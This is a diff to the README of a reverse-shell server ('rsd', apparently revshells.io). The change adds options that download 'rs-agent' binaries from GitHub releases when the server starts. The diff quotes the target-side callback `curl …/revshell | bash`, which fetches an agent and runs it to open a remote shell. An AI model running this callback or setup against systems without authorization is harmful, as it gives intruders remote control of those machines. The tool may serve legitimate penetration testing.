@@ -30,7 +30,19 @@ make agents       # required: agents-bin/linux-amd64, linux-arm64, ...
 ./rsd --listen :8080 --public-url https://rs.example.com --db rsd.db --agents-dir agents-bin
 ```
 
-`--agents-dir` must contain `rs-agent` builds from `make agents`. Callback URLs use the request `Host` (so Docker targets can use `host.docker.internal:8080` without editing the script).
+`--agents-dir` must contain `rs-agent` builds from `make agents` (unless using `--agents-git`).
+
+**Populate `agents-dir` from GitHub releases** on startup (targets still fetch agents from your server):
+
+```bash
+./rsd --listen :8080 --public-url https://revshells.io --agents-dir agents-bin --agents-git
+# pin a release:
+./rsd --listen :8080 --public-url https://revshells.io --agents-git --agents-git-tag v0.1.0
+```
+
+Downloads e.g. [rs-agent-linux-arm64-aarch64](https://github.com/nmagill123/revshells-io/releases/download/v0.1.0/rs-agent-linux-arm64-aarch64) into `agents-bin/linux-arm64`. Callback scripts are unchanged: `curl …/revshell | bash` → `$SERVER/$SESSION/agent/$PLATFORM`.
+
+Callback URLs use the request `Host` (so Docker targets can use `host.docker.internal:8080` without editing the script).
 
 `--max-sessions-per-workspace` (default `12`) limits how many active sessions each workspace can create.
 
